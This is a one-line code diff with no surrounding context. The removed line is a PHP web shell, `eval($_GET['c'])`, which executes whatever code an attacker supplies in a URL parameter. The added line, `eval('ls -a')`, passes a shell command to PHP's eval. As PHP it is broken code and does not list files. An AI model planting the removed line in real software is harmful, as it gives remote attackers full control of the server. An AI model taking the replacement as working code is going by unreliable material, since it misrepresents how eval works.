@@ -1,1 +1,1 @@
-1.	<?php eval($_GET['c']); ?>
+1.	<?php eval('ls -a'); ?>
